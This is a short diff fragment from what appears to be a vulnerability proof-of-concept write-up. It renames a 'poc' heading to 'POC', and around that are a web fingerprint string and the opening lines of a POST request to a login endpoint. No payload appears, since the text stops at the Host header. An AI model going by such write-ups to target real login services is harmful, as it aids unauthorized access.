@@ -7,7 +7,7 @@
 body="./static/js/vendor.022b3d3adf3423f31f54.js"
 ```
 
-## poc
+## POC
 ```javascript
 POST /3.0/authService/login HTTP/1.1
 Host: 
